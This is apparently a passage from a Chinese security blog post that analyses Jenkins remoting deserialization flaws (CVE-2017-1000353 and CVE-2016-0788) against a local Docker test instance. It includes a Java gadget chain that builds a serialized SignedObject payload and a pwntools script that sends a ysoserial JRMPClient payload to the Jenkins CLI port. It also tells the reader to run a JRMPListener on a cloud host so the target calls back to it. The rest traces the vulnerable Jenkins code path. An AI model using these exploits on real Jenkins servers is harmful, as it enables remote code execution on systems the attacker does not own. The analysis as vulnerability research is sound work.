class="hljs-string">&quot;signature&quot;</span>, <span class="hljs-string">&quot;Twings&quot;</span>.getBytes());<br>setField(signedObject, <span class="hljs-string">&quot;thealgorithm&quot;</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br><span class="hljs-type">ListOrderedSet</span> <span class="hljs-variable">listOrderedSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListOrderedSet</span>();<br>setField(listOrderedSet, <span class="hljs-string">&quot;collection&quot;</span>, jsonArray);<br><br><span class="hljs-type">ConcurrentSkipListSet</span> <span class="hljs-variable">concurrentSkipListSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentSkipListSet</span>();<br>concurrentSkipListSet.add(<span class="hljs-string">&quot;1&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> getFieldValue(concurrentSkipListSet, <span class="hljs-string">&quot;m&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">head</span> <span class="hljs-operator">=</span> getFieldValue(m, <span class="hljs-string">&quot;head&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> getFieldValue(head, <span class="hljs-string">&quot;node&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> getFieldValue(node, <span class="hljs-string">&quot;next&quot;</span>);<br>setField(next, <span class="hljs-string">&quot;key&quot;</span>, signedObject);<br><br><span class="hljs-type">CopyOnWriteArrayList</span> <span class="hljs-variable">copyOnWriteArrayList1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>();<br>copyOnWriteArrayList1.add(<span class="hljs-string">&quot;1&quot;</span>);<br>copyOnWriteArrayList1.add(<span class="hljs-string">&quot;2&quot;</span>);<br>Object[] array1 = (Object[])getFieldValue(copyOnWriteArrayList1, <span class="hljs-string">&quot;array&quot;</span>);<br>array1[<span class="hljs-number">0</span>] = listOrderedSet;<br>array1[<span class="hljs-number">1</span>] = concurrentSkipListSet;<br><br><span class="hljs-type">CopyOnWriteArrayList</span> <span class="hljs-variable">copyOnWriteArrayList2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>();<br>copyOnWriteArrayList2.add(<span class="hljs-string">&quot;1&quot;</span>);<br>copyOnWriteArrayList2.add(<span class="hljs-string">&quot;2&quot;</span>);<br>Object[] array2 = (Object[])getFieldValue(copyOnWriteArrayList2, <span class="hljs-string">&quot;array&quot;</span>);<br>array2[<span class="hljs-number">0</span>] = concurrentSkipListSet;<br>array2[<span class="hljs-number">1</span>] = listOrderedSet;<br><br><span class="hljs-type">CopyOnWriteArraySet</span> <span class="hljs-variable">copyOnWriteArraySet1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArraySet</span>();<br>setField(copyOnWriteArraySet1, <span class="hljs-string">&quot;al&quot;</span>, copyOnWriteArrayList1);<br><br><span class="hljs-type">CopyOnWriteArraySet</span> <span class="hljs-variable">copyOnWriteArraySet2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArraySet</span>();<br>setField(copyOnWriteArraySet2, <span class="hljs-string">&quot;al&quot;</span>, copyOnWriteArrayList2);<br><br><span class="hljs-type">ReferenceMap</span> <span class="hljs-variable">referenceMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceMap</span>();<br>referenceMap.put(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Twings&quot;</span>);<br>referenceMap.put(<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;Aluvion&quot;</span>);<br>Object[] data = (Object[])getFieldValue(referenceMap, <span class="hljs-string">&quot;data&quot;</span>);<br>setField(data[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;key&quot;</span>, copyOnWriteArraySet1);<br>setField(data[<span class="hljs-number">7</span>], <span class="hljs-string">&quot;key&quot;</span>, copyOnWriteArraySet2);<br><br><span class="hljs-type">byte</span>[] poc = serialize(referenceMap);<br>System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(poc)));<br>unserialize(poc);<br></code></pre></td></tr></table></figure>

<p>使用反射还是要麻烦一些的，不过也容易理解一些，然后再仿照 payload 整个 python 脚本就行了。顺带一提，给出的 payload 里面的序列化 Capability 对象好像有点问题，可以自己改一下它的 mask 属性，修改后的 Capability 对象如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">preamble = <span class="hljs-string">&quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;</span> \<br>           <span class="hljs-string">&quot;rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=&quot;</span><br></code></pre></td></tr></table></figure>



<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>将 SignedObject 加入黑名单。</p>
<h3 id="CVE-2016-0788"><a href="#CVE-2016-0788" class="headerlink" title="CVE-2016-0788"></a>CVE-2016-0788</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull jenkins:1.642.1<br></code></pre></td></tr></table></figure>

<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>跟 CVE-2017-1000353 一样都是 CVE-2015-8103 的绕过，触发点也相同，不过这里走的不是 HTTP 途径，而且用的是 JRMP 方式，1.642.1 版本下的黑名单如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassFilter</span>.RegExpClassFilter(Arrays.asList(Pattern.compile(<span class="hljs-string">&quot;^org\\.codehaus\\.groovy\\.runtime\\..*&quot;</span>), Pattern.compile(<span class="hljs-string">&quot;^org\\.apache\\.commons\\.collections\\.functors\\..*&quot;</span>), Pattern.compile(<span class="hljs-string">&quot;.*org\\.apache\\.xalan.*&quot;</span>)));<br></code></pre></td></tr></table></figure>

<p>没有禁止 JRMP，所以可以通过反序列化创建一个 JRMP Client 连接我们的 Sever，返回 commons-collections 的序列化攻击链实现攻击。（当然反过来用 JRMP Listener 也是可以的）</p>
<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>ysoerial 中就有这个漏洞的利用代码，可以读一下。</p>
<h5 id="JenkinsReverse"><a href="#JenkinsReverse" class="headerlink" title="JenkinsReverse"></a>JenkinsReverse</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>target = remote(<span class="hljs-string">&quot;172.17.0.2&quot;</span>, <span class="hljs-number">50000</span>)<br><br>protocol = <span class="hljs-string">&quot;Protocol:CLI-connect&quot;</span><br>target.send(<span class="hljs-string">&quot;\x00&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(protocol)) + protocol)<br>target.recv()<br>pause()<br>capability = <span class="hljs-string">&quot;rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=&quot;</span><br>target.send(<span class="hljs-string">&quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;</span>)<br>target.send(capability)<br>pause()<br>target.send(<span class="hljs-string">&quot;\x00\x00\x00\x00&quot;</span>)<br>JRMPClient = base64.b64decode(<span class="hljs-string">&quot;JRMPClient payload from ysoserial&quot;</span>)<br>target.send(JRMPClient)<br><br>target.interactive()<br>target.close()<br></code></pre></td></tr></table></figure>

<p>然后在云主机之类的地方用 ysoserial 开个 JRMPListener 即可。</p>
<h5 id="JenkinsListener"><a href="#JenkinsListener" class="headerlink" title="JenkinsListener"></a>JenkinsListener</h5><p>这种方式就比较复杂了，主要分为三步，每次传输的都是一段序列化数据，然后触发服务端相应的处理，第一步的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InetSocketAddress</span> <span class="hljs-variable">isa</span> <span class="hljs-operator">=</span> JenkinsCLI.getCliPort(jenkinsUrl);<br>c = JenkinsCLI.openChannel(isa);<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">call</span> <span class="hljs-operator">=</span> c.call( JenkinsCLI.getPropertyCallable(JarLoader.class.getName() + <span class="hljs-string">&quot;.ours&quot;</span>));<br></code></pre></td></tr></table></figure>

<p>getPropertyCallable 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Callable&lt;?, ?&gt; getPropertyCallable ( <span class="hljs-keyword">final</span> Object prop )<br>    <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>    Class&lt;?&gt; reqClass = Class.forName(<span class="hljs-string">&quot;hudson.remoting.RemoteInvocationHandler$RPCRequest&quot;</span>);<br>    Constructor&lt;?&gt; reqCons = reqClass.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Method.class, Object[].class);<br>    Reflections.setAccessible(reqCons);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">getJarLoader</span> <span class="hljs-operator">=</span> reqCons<br>        .newInstance(<span class="hljs-number">1</span>, Class.forName(<span class="hljs-string">&quot;hudson.remoting.IChannel&quot;</span>).getMethod(<span class="hljs-string">&quot;getProperty&quot;</span>, Object.class), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>            prop<br>        &#125;);<br>    <span class="hljs-keyword">return</span> (Callable&lt;?, ?&gt;) getJarLoader;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>简单来说就是一个 RPCRequest 类，它是 Command 类的子类，其构造函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">RPCRequest</span><span class="hljs-params">(<span class="hljs-type">int</span> oid, Method m, Object[] arguments, ClassLoader cl)</span> &#123;<br>    <span class="hljs-built_in">this</span>.oid = oid;<br>    <span class="hljs-built_in">this</span>.arguments = arguments;<br>    <span class="hljs-built_in">this</span>.methodName = m.getName();<br>    <span class="hljs-built_in">this</span>.classLoader = cl;<br>    <span class="hljs-built_in">this</span>.types = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[arguments.length];<br>    Class&lt;?&gt;[] params = m.getParameterTypes();<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arguments.length; ++i) &#123;<br>        <span class="hljs-built_in">this</span>.types[i] = params[i].getName();<br>    &#125;<br><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">this</span>.types.length == arguments.length;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>所以该对象中的 oid 属性为 1，methodName 属性为 getProperty，arguments 属性为 JarLoader.ours。然后到了服务端那边：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    cmd = SynchronousCommandTransport.<span class="hljs-built_in">this</span>.read();<br>&#125; <span class="hljs-keyword">catch</span> (EOFException var23) &#123;<br>    <span class="hljs-type">IOException</span> <span class="hljs-variable">ioe</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Unexpected termination of the channel&quot;</span>);<br>    ioe.initCause(var23);<br>    <span class="hljs-keyword">throw</span> ioe;<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var24) &#123;<br>    SynchronousCommandTransport.LOGGER.log(Level.SEVERE, <span class="hljs-string">&quot;Unable to read a command (channel &quot;</span> + name + <span class="hljs-string">&quot;)&quot;</span>, var24);<br>    <span class="hljs-keyword">continue</span>;<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    ++<span class="hljs-built_in">this</span>.commandsReceived;<br>&#125;<br><br><span class="hljs-built_in">this</span>.receiver.handle(cmd);<br></code></pre></td></tr></table></figure>

<p>反序列化出 RPCRequest 对象后，会调用 handler：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Command cmd)</span> &#123;<br>    Channel.<span class="hljs-built_in">this</span>.updateLastHeard();<br>    <span class="hljs-keyword">if</span> (Channel.logger.isLoggable(Level.FINE)) &#123;<br>        Channel.logger.fine(<span class="hljs-string">&quot;Received &quot;</span> + cmd);<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        cmd.execute(Channel.<span class="hljs-built_in">this</span>);<br>    &#125; <br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后调用 RPCRequest 的 execute，关键的三行代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">channel.pipeWriter.get(Request.<span class="hljs-built_in">this</span>.lastIoId).get();<br><span class="hljs-type">RSP</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Request.<span class="hljs-built_in">this</span>.perform(channel);<br>rsp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(Request.<span class="hljs-built_in">this</span>.id, <span class="hljs-built_in">this</span>.calcLastIoId(), r);<br></code></pre></td></tr></table></figure>

<p>通过 perform 进行处理，然后将 Response 写入相应，perform 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Serializable <span class="hljs-title function_">perform</span><span class="hljs-params">(Channel channel)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> channel.getExportedObject(<span class="hljs-built_in">this</span>.oid);<br>    Class[] clazz = channel.getExportedTypes(<span class="hljs-built_in">this</span>.oid);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.choose(clazz);<br>        <span class="hljs-keyword">if</span> (m == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">&quot;Unable to call &quot;</span> + <span class="hljs-built_in">this</span>.methodName + <span class="hljs-string">&quot;. No matching method found in &quot;</span> + Arrays.toString(clazz) + <span class="hljs-string">&quot; for &quot;</span> + o);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br><br>            Object r;<br>            <span class="hljs-keyword">try</span> &#123;<br>                r = m.invoke(o, <span class="hljs-built_in">this</span>.arguments);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var7) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemotingSystemException</span>(<span class="hljs-string">&quot;failed to invoke &quot;</span> + m + <span class="hljs-string">&quot; on &quot;</span> + o + Arrays.toString(<span class="hljs-built_in">this</span>.arguments), var7);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (r != <span class="hljs-literal">null</span> &amp;&amp; !(r <span class="hljs-keyword">instanceof</span> Serializable)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemotingSystemException</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassCastException</span>(r.getClass() + <span class="hljs-string">&quot; is returned from &quot;</span> + m + <span class="hljs-string">&quot; on &quot;</span> + o.getClass() + <span class="hljs-string">&quot; but it&#x27;s not serializable&quot;</span>));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> (Serializable)r;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var8) &#123;<br>        <span class="hljs-keyword">throw</span> var8.getTargetException();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过 choose 获取反射函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Method <span class="hljs-title function_">choose</span><span class="hljs-params">(Class[] interfaces)</span> &#123;<br>    Class[] arr$ = interfaces;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">len$</span> <span class="hljs-operator">=</span> interfaces.length;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i$</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i$ &lt; len$; ++i$) &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> arr$[i$];<br>        Method[] arr$ = clazz.getMethods();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len$</span> <span class="hljs-operator">=</span> arr$.length;<br><br>        label38:<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i$</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i$ &lt; len$; ++i$) &#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> arr$[i$];<br>            <span class="hljs-keyword">if</span> (m.getName().equals(<span class="hljs-built_in">this</span>.methodName)) &#123;<br>                Class&lt;?&gt;[] paramTypes = m.getParameterTypes();<br>                <span class="hljs-keyword">if</span> (paramTypes.length == <span class="hljs-built_in">this</span>.arguments.length) &#123;<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.types.length; ++i) &#123;<br>                        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.types[i].equals(paramTypes[i].getName())) &#123;<br>                            <span class="hljs-keyword">continue</span> label38;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> m;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看出反射函数来自反射主体所继承的接口，并且要与函数名、参数等数据吻合。</p>
<p>然后就是一个显眼的反射操作，oid、method 都是可以可控制的，需要看一下的就是 channel.getExportedObject（作为反射的主体）和 channel.getExportedTypes（用于获取执行反射操作的函数）获取到的结果，经过调试可以发现，exportedObjects 表中只有一个成员，channel 自身。然后则会调用该 channel 的 getProperty 函数，参数为 JarLoader.ours，同样通过调试可以看到 properties 属性的值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;hudson.cli.CliEntryPoint=hudson.cli.CliManagerImpl@405894b7, hudson.remoting.JarLoader.ours=hudson.remoting.JarLoaderImpl@<span class="hljs-number">44671864</span>&#125;<br></code></pre></td></tr></table></figure>

<p>所以这一步获取到的实际上是一个 JarLoaderImpl 对象，然后生成 Response：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserResponse</span>(<span class="hljs-built_in">this</span>.serialize(r, channel), <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure>

<p>并写入响应：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">channel.send(rsp);<br></code></pre></td></tr></table></figure>

<p>在序列化 JarLoaderImpl 对象的时候，会触发其 writeReplace 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">writeReplace</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Channel.current().export(JarLoader.class, <span class="hljs-built_in">this</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>调用 channel 的 export 函数将自身放入其 exportedObjects 表中，所以下次交互进行到 perform 函数中的反射时，可以使用 JarLoaderImpl 作为反射主体。</p>
<p>经过处理后，最终返回的是一个 Proxy 对象，其 invocationhandler 中存放着 JarLoaderImpl 对象的 oid（用于表示远程对象的一个数字），调试可得其为 2。</p>
<p>然后进入第二步：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">uro</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPListener</span>().getObject(String.valueOf(jrmpPort));<br><br>Class&lt;?&gt; reqClass = Class.forName(<span class="hljs-string">&quot;hudson.remoting.RemoteInvocationHandler$RPCRequest&quot;</span>);<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> makeIsPresentOnRemoteCallable(oid, uro, reqClass);<br><br><span class="hljs-keyword">try</span> &#123;<br>    c.call((Callable&lt;?, ?&gt;) o);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>生成一段 JRMPListener payload，然后调用 makeIsPresentOnRemoteCallable：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeIsPresentOnRemoteCallable</span> <span class="hljs-params">( <span class="hljs-type">int</span> oid, Object uro, Class&lt;?&gt; reqClass )</span><br>    <span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException &#123;<br>    Constructor&lt;?&gt; reqCons = reqClass.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Method.class, Object[].class);<br>    Reflections.setAccessible(reqCons);<br>    <span class="hljs-keyword">return</span> reqCons<br>        .newInstance(oid, JarLoader.class.getMethod(<span class="hljs-string">&quot;isPresentOnRemote&quot;</span>, Class.forName(<span class="hljs-string">&quot;hudson.remoting.Checksum&quot;</span>)), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>            uro,<br>        &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到生成的同样是一个 RPCRequest 类，这次其 oid 为 2，methodName 为 isPresentOnRemote，arguments 为 JRMPListener payload。这样来到 perform 函数时，就是在 JarLoaderImpl 对象上调用其接口 JarLoader 的 isPresentOnRemote 函数，但是这里有个问题，JarLoader 接口的 isPresentOnRemote 函数是一个抽象函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-title function_">isPresentOnRemote</span><span class="hljs-params">(Checksum var1)</span>;<br></code></pre></td></tr></table></figure>

<p>于是就会报错并抛出异常：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemotingSystemException</span>(<span class="hljs-string">&quot;failed to invoke &quot;</span> + m + <span class="hljs-string">&quot; on &quot;</span> + o + Arrays.toString(<span class="hljs-built_in">this</span>.arguments), var7);<br></code></pre></td></tr></table></figure>

<p>而上一层则会捕捉异常并将其作为响应：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">catch</span> (Throwable var18) &#123;<br>    rsp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(Request.<span class="hljs-built_in">this</span>.id, <span class="hljs-built_in">this</span>.calcLastIoId(), var18);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>观察报错信息：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">failed to<span class="hljs-built_in"> invoke </span>public<span class="hljs-keyword"> abstract</span> boolean hudson.remoting.JarLoader.isPresentOnRemote(hudson.remoting.Checksum) on hudson.remoting.JarLoaderImpl@2cae1e9d[ActivationGroupImpl[UnicastServerRef [liveRef: [endpoint:[172.17.0.2:12345](local),objID:[6c817df0:175f8bef343:-7ffd, 937379779203472170]]]]]<br></code></pre></td></tr></table></figure>

<p>报错会打印出 arguments，也就是 JRMPListener payload，这是一个 ActivationGroupImpl -&gt; UnicastServerRef -&gt; LiveRef 的对象，而在报错打印数据时调用的 LiveRef 的 toString 函数中：</p>
